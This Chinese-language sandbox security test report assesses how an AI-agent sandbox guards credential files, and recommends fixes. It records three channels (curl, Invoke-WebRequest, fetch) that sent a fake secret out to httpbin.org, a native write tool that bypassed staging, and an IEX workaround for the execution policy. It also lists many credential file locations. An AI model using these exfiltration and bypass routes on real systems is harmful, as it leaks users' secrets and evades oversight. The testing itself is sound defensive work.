# 个人敏感文件保护域 — 实测小结（sensitive-tester）

范围：SEN-01 ~ SEN-07。写入范围仅 `_sandbox-tests\sensitive\`。
红线遵守：**未读取/未输出/未复制/未外发任何真实凭据或密码内容**；只记录 存在/可读/大小/时间/路径 等元数据。唯一被打印的“秘密”是我自己构造的假秘密 `FAKE_SECRET_cgiogyoouhbsvsid`。未对任何真实敏感文件执行删除/覆盖/改名/改权限。

## 一句话结论

沙箱对个人敏感文件**既不是读保护，也不是写保护，而是「读完全开放 + 写靠 staging 事后隔离 + 但原生工具通道直接写真实磁盘」**；`sensitive` 分类确实存在于代码与候选清单中，但**在操作发生的时刻没有任何提示**，且**敏感内容可以无阻碍外发**。

## 状态计数

| 状态 | 数量 | 条目 |
|---|---|---|
| FAIL | 4 | SEN-01、SEN-02、SEN-04、SEN-06 |
| FINDING | 5 | SEN-03、SEN-05、SEN-07、ENV-01、ENV-02 |
| BLOCKED | 0 | 本域没有任何“被沙箱拒绝”的敏感访问 |
| N-A | 0 | （子项中有“路径不存在”，见下） |
| OK | 0 | — |

> 说明：`BLOCKED=0` 本身就是本域最重要的结论之一 —— 该拦的地方一次都没拦。

## 最严重的 3 条

1. **【严重】敏感内容无阻碍外发（SEN-04，FAIL）**
   假秘密写入 danger 档 `C:\Users\Administrator\.dsh\dsh-exfil-secret.txt`（mask=dsh-home）后，`curl.exe --data-binary @file`、`Invoke-WebRequest -InFile`、node `fetch` **三通道全部 POST 成功**到 `https://httpbin.org/post`，响应回显证明字节确已出网。无审批、无白名单、无告警。真实文件同样可读（下一条），故真实凭据可被同样外发是直接推论。

2. **【严重】敏感文件读面完全开放（SEN-01，FAIL）**
   仅元数据探测（未读内容）证明：`.dsh\.credentials.yaml` 223B `READ_OK`（danger）、`.npmrc` 40B `READ_OK`（danger）、`PSReadLine\ConsoleHost_history.txt` 8084B `READ_OK`；`%APPDATA%\Microsoft\Protect`（DPAPI 主密钥）`LIST_OK:2`、`%LOCALAPPDATA%\Microsoft\Credentials` `LIST_OK:3`、`.dsh` `LIST_OK:13`。连写打开也放行（`WRITEOPEN_OK`，未写字节）。
   源码自认「掩码清单是检测/兜底，不是硬边界；读面硬边界 T0（AppContainer）尚未接线，残余边界 R1」——也就是说，**规则描述的是“应当被遮蔽”，而不是“已经挡住了”**。

3. **【严重】同一件事两条通道语义相反：原生 write 工具直接写真实磁盘（SEN-02）**
   - shell(pwsh) 通道：4 个敏感位置写入全部 `WRITE_OK` 但**真实磁盘零改动**（宿主精确复核 4/4 `not found`，连 `.ssh` 目录都没在真实磁盘创建）→ 隔离正确。
   - 宿主 **write 工具**通道：写 `Documents\dsh-probe-nonexistent-dir\x.txt` 返回 `Created file`，宿主 read 立即读回 `probe`，**真实磁盘落地**，该时点 `review.json` 无候选。即主通道既不经过 shim、也不产生候选、更不需要审批。

## 分项要点

- **SEN-02 补充**：敏感位置**写入不被拒绝**（无 BLOCKED），而是静默进 staging；用户不会知道有人往 `.ssh` 或凭据目录写了东西。
- **SEN-03（FINDING，部分完成）**：删除被重定向到 overlay。对“仅在真实磁盘、未进 staged”的文件，`Remove-Item` 报 `ItemNotFoundException`、`cmd del` 退出码 0，而真实文件**仍在**且沙箱内从此看不见它（tombstone 遮蔽）。**未测**：改名、`icacls` 改权限、覆盖为 0 字节（诚实标注）。对真实凭据文件的破坏性操作按红线刻意未做。
- **SEN-05（FINDING）**：工作区内 `.env` / `id_rsa` / `credentials.json` 判定为 `(none)`→`normal`（工作区内豁免）；`Documents\` 下的同名文件及 `secret.docx/.pdf/.xlsx/photo.jpg` 判为 `(none)`→`outside`。会命中的是**目录/命名约定类**（`.ssh`/`.aws`/`.config\gcloud`/`.dsh`/`.npmrc`/`.git-credentials`/DPAPI/凭据管理器/浏览器固定文件名）。方法学校准：`MASK_PROBES` 正向对照 **68/68** 复现声明类别。
- **SEN-06（FAIL，已按 Lead 复核修正）**：我在会话内**三次**读同一路径 `.dshstage\review.json`，字节完全相同且全为 0（`generatedAt` 冻结在 2026-10-02T10:36:21.594Z、`revision=0`、`riskCounts` 全 0、`candidates=[]`、`alerts=[]`）。Lead 随后独立解析得 `revision=4483`、约 1624 文件、`riskCounts={normal:1568,outside:29,sensitive:27,danger:20}`、`candidates:2`、`alerts:1`。
  → **原结论“review.json 完全没反映这些操作”撤回**，改为：*(采样时点结论)* 该路径在我整个操作窗口内冻结为全 0；**更准确的表述是：敏感路径写入确实会被分类并进入候选（sensitive:27 / danger:20 量级），但没有任何实时提示，用户只能自己主动去翻 review.json。** 我无法把本次四次 danger 档写入关联到任何具体候选；两份存储/两个路径的差异本身也是需要澄清的可用性问题。
- **SEN-07（FINDING）**：四个透明度问题全部答不出；报错文本是内部诊断串；`.ps1` 被执行策略拒绝（须 IEX 绕过）；pwsh 多次静默返回空输出。
- **ENV-01**：执行门 `STAGING_WRITE_UNVERIFIED` 高频误报（探针子进程 `0xC0000005` / `0xE0434352` / PowerShell 初始化失败 `/exit=2`），拒绝执行且常吞掉输出。

## 敏感路径「已识别 / 未识别」清单

**规则会识别（命中 MASK_CLASSES）**
`.ssh\`(dir+all, danger)、`.aws\`(danger)、`.config\gcloud\`(danger)、`.kube\`(danger)、`.git-credentials`(danger)、`.npmrc`(danger)、`.dsh\` 全目录(danger)、**`.dsh\.credentials.yaml`(dsh-credentials, 只到 risk 档，未进 danger 清单)**、`.dsh\profiles\*\node_modules`(danger)、`%APPDATA%\Microsoft\Protect`(danger)、`%APPDATA%|%LOCALAPPDATA%\Microsoft\Credentials`(risk)、`%LOCALAPPDATA%\|%APPDATA%\Microsoft\Vault`(risk)、浏览器 `Login Data` / `Login Data For Account` / `Web Data` / `Network\Cookies` / profile 形状下的 `History` / `Local State`、`NTUSER.DAT`/`UsrClass.dat`(danger)、`SAM/SECURITY/SYSTEM`+`System32\config`(danger)、`hosts`/`lmhosts`、`.dshstage`(danger, unmask 永不解除)、`unattend.xml` 族、`ntds.dit`、`WlanSvc`(danger)、`PSReadLine\`、VSCode/Cursor `globalStorage`、`*.pfx|p12|pvk|pem|key`（限 users/programdata）、`InetCookies`、`*.dmp`、CLI 凭据目录（`.config\{gh,gcloud,azure,aws,pulumi,doctl}`、`.terraform.d`、`.pulumi`）、包管理器令牌族（`.yarnrc`、`.pypirc`、`.netrc`、`.nuget\NuGet.Config`、`.config\pip\pip.conf`、`.docker\config.json`、`.cargo\credentials`）、`Windows\System32\winevt\Logs\*.evtx`、`networks`/`protocol`。

**规则不会识别（本次实测“未覆盖”）**
- `C:\Users\Administrator\.azure\`（顶层 `.azure`，只有 `.config\azure` 才命中）→ `(none)`，仅算 `outside`
- 工作区内的 `.env` / `id_rsa` / `credentials.json` / `plain.txt` → `(none)` → `normal`
- `Documents\` 下的 `.env` / `id_rsa` / `credentials.json` / `.docx` / `.pdf` / `.xlsx` / `.jpg` → `(none)` → `outside`（**个人文档目录整体不因“个人”而受保护**）
- `Documents` / `Desktop` / `Downloads` 目录自身 → `(none)`

**本机不存在（切勿误记为“被拒”）**
`.ssh\`（整目录、id_rsa、id_ed25519、known_hosts）、`.aws\`、`.azure\`、`.config\gcloud\`、`.git-credentials`、Chrome `User Data\Default\{Login Data,Cookies,Web Data}`。`NTUSER.DAT` 存在于真实磁盘、可 stat（1310720B），读内容 `EBUSY`（系统占用），写打开 `denied`。

## 三通道取证方法（本次可信度基础）

- **PS / CMD**：被 shim hook（读透写重定向）。**注意**：pwsh 的 CWD 已是 `...\.dshstage\sessions\<sid>\staged`。
- **STAGE（地面真值）**：宿主 `read`/`glob` 工具（不经 hook）。校准实验：pwsh 写入 `_sandbox-tests\sensitive\calib.txt` → 出现在 `staged\fs\C\...\calib.txt`，而宿主 read/glob 对真实路径 `_sandbox-tests\sensitive` 返回 **not found（目录不存在）** ⇒ 宿主工具确为真实磁盘视图；本报告所有“是否落地真实磁盘”的结论均以此通道为准。
- **发现的通道副作用（FINDING）**：在**被 shim 的子进程内**，`realpath()`/`canonical()` 会返回 **staged 路径**（例：`C:\Users\Administrator\.azure` → `...\.dshstage\sessions\...\staged\fs\C\...\.azure`），而 `stage-store` 规则在 MASK_CLASSES 中排序靠前，于是**凡被映射的路径都会被判成 `stage-store`**（仍属 danger，故为“过判”而非漏判，但证明 shim 的路径虚拟化泄漏进了判据层）。因此我改用「MASK_CLASSES 正则直接作用于真实路径」并加 68 条 `MASK_PROBES` 正向对照来判级。

## 测试遗留物（明确申报）

- `C:\Users\Administrator\Documents\dsh-probe-nonexistent-dir\x.txt`（内容 `probe`，1 行）及父目录 —— 由**宿主 write 工具**在 SEN-02 中真实创建；四种沙箱内删除方式全部无效（详见 ENV-02）。
  **未清理成功，请宿主侧删除。**
- `_sandbox-tests\sensitive\` 下的假秘密文件（`dsh-exfil-secret.txt`、`dsh-sensitive-probe.txt` 等）只存在于 staging，真实磁盘已复核为 `not found`。

## 建议（按收益排序）

1. **先修外发**：至少对 danger 档来源的读句柄做外发标记/审批；当前读面开放 + egress 无限制 = 凭据必泄。
2. **统一写入语义**：禁止任何通道（尤其原生 write 工具）绕过 staging 直落真实磁盘；跨通道不一致会让所有隔离承诺失效。
3. **补实时提示**：读/写 danger 档都应有一次显式提示（读也要，因为读面开放），不要只写进 review.json。
4. **提供状态入口**：`dsh stage ls` 或面板徽标，实时显示 pending/sensitive/danger 计数与路径清单（源码注释自己也提了这个建议）。
5. **诚实文档化边界**：掩码清单 = 检测/兜底，**不是**读边界；若 T0/AppContainer 未接线，界面必须明示。
6. **修执行门误报**：把“自检失败”与“真实拦截”分开，并输出人话提示。
